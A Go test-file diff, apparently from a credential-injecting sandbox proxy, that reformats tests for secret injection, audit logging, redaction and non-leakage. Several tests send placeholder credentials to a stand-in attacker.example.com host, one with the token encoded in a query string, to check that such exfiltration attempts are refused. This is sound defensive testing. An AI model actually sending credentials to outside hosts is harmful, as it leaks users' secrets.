@@ -15,7 +15,11 @@ import (
 )
 
 func TestInjectionPersistsAuditBeforeChangingAnyHeader(t *testing.T) {
-	for _, mode := range []string{"record_success", "record_failure", "legacy_success"} {
+	for _, mode := range []string{
+		"record_success",
+		"record_failure",
+		"legacy_success",
+	} {
 		t.Run(mode, func(t *testing.T) {
 			r, err := http.NewRequest("POST", "https://example.com/private-path?private=query", nil)
 			if err != nil {
@@ -25,14 +29,18 @@ func TestInjectionPersistsAuditBeforeChangingAnyHeader(t *testing.T) {
 			r.Header.Set("X-API-Key", "guest-value")
 			creds, err := compileSecrets(map[string]Secret{
 				"explicit": {
-					Value:       "Bearer host-explicit-secret",
-					Hosts:       []string{"example.com"},
+					Value: "Bearer host-explicit-secret",
+					Hosts: []string{
+						"example.com",
+					},
 					Header:      "Authorization",
 					Placeholder: "Bearer phantom",
 				},
 				"implicit": {
-					Value:  "host-implicit-secret",
-					Hosts:  []string{"example.com"},
+					Value: "host-implicit-secret",
+					Hosts: []string{
+						"example.com",
+					},
 					Header: "X-API-Key",
 				},
 			})
@@ -55,15 +63,27 @@ func TestInjectionPersistsAuditBeforeChangingAnyHeader(t *testing.T) {
 				if err != nil {
 					t.Fatal(err)
 				}
-				for _, private := range []string{"host-explicit-secret", "host-implicit-secret", "private-path", "private=query"} {
+				for _, private := range []string{
+					"host-explicit-secret",
+					"host-implicit-secret",
+					"private-path",
+					"private=query",
+				} {
 					if strings.Contains(string(data), private) {
 						t.Error("audit contained private request material")
 					}
 				}
 			}
-			opts := Options{Audit: func(AuditEvent) { legacyCalls++ }}
+			opts := Options{
+				Audit: func(AuditEvent) {
+					legacyCalls++
+				},
+			}
 			if mode == "legacy_success" {
-				opts.Audit = func(event AuditEvent) { legacyCalls++; check(event) }
+				opts.Audit = func(event AuditEvent) {
+					legacyCalls++
+					check(event)
+				}
 			} else {
 				opts.AuditRecord = func(event AuditEvent) error {
 					check(event)
@@ -74,8 +94,13 @@ func TestInjectionPersistsAuditBeforeChangingAnyHeader(t *testing.T) {
 				}
 			}
 			b := &binding{
-				info:    Binding{SandboxID: "sandbox", TenantID: "tenant"},
-				manager: &Manager{opts: opts},
+				info: Binding{
+					SandboxID: "sandbox",
+					TenantID:  "tenant",
+				},
+				manager: &Manager{
+					opts: opts,
+				},
 				secrets: creds,
 			}
 			err = b.inject(r, "example.com")
@@ -130,19 +155,29 @@ func TestHTTPSSecretInjectionAndNonLeak(t *testing.T) {
 		Options{
 			RootCAs:     pool,
 			DialContext: targetDialer(up.Listener.Addr().String(), nil),
-			Audit:       func(e AuditEvent) { mu.Lock(); events = append(events, e); mu.Unlock() },
+			Audit: func(e AuditEvent) {
+				mu.Lock()
+				events = append(events, e)
+				mu.Unlock()
+			},
 		},
-		Policy{Mode: "relay"},
+		Policy{
+			Mode: "relay",
+		},
 		map[string]Secret{
 			"API_TOKEN": {
-				Value:       real,
-				Hosts:       []string{"example.com"},
+				Value: real,
+				Hosts: []string{
+					"example.com",
+				},
 				Header:      "Authorization",
 				Placeholder: "Bearer phantom",
 			},
 			"API_KEY": {
-				Value:  "second-host-only-secret",
-				Hosts:  []string{"example.com"},
+				Value: "second-host-only-secret",
+				Hosts: []string{
+					"example.com",
+				},
 				Header: "X-API-Key",
 			},
 		},
@@ -169,7 +204,11 @@ func TestHTTPSSecretInjectionAndNonLeak(t *testing.T) {
 		!strings.Contains(string(data), `"tenant_id":"tenant-1"`) {
 		t.Fatalf("injection was not audited: %s", data)
 	}
-	for _, u := range []string{"https://attacker.example.com/", "http://example.com/", "http://attacker.example.com/"} {
+	for _, u := range []string{
+		"https://attacker.example.com/",
+		"http://example.com/",
+		"http://attacker.example.com/",
+	} {
 		req, _ := http.NewRequest("GET", u, nil)
 		req.Header.Set("Authorization", "Bearer phantom")
 		resp, err := client.Do(req)
@@ -190,7 +229,9 @@ func TestRedactionAcrossReadBoundaries(t *testing.T) {
 				data: []byte("prefix-host-secret-suffix-host-secret"),
 			},
 		),
-		values: []string{"host-secret"},
+		values: []string{
+			"host-secret",
+		},
 	}
 	data, err := io.ReadAll(body)
 	if err != nil {
@@ -201,7 +242,9 @@ func TestRedactionAcrossReadBoundaries(t *testing.T) {
 	}
 }
 
-type oneByteReader struct{ data []byte }
+type oneByteReader struct {
+	data []byte
+}
 
 func (r *oneByteReader) Read(p []byte) (int, error) {
 	if len(r.data) == 0 {
@@ -220,16 +263,22 @@ func TestCredentialsRequireAuditAndEncodedPlaceholdersAreDenied(t *testing.T) {
 	defer m.Close()
 	secrets := map[string]Secret{
 		"key": {
-			Value:       "host-secret",
-			Hosts:       []string{"example.com"},
+			Value: "host-secret",
+			Hosts: []string{
+				"example.com",
+			},
 			Header:      "Authorization",
 			Placeholder: "Bearer phantom",
 		},
 	}
-	if err := m.Bind(context.Background(), "s", "t", "/tmp/unused", Policy{Mode: "relay"}, secrets); err == nil {
+	if err := m.Bind(context.Background(), "s", "t", "/tmp/unused", Policy{
+		Mode: "relay",
+	}, secrets); err == nil {
 		t.Fatal("credentials activated without an audit sink")
 	}
-	m2, b := newTestManager(t, Options{}, Policy{Mode: "relay"}, secrets)
+	m2, b := newTestManager(t, Options{}, Policy{
+		Mode: "relay",
+	}, secrets)
 	resp, _ := get(t, proxyClient(t, m2, b), "https://attacker.example.com/?token=Bearer+phantom")
 	if resp.StatusCode != 403 {
 		t.Fatal("encoded placeholder was forwarded")
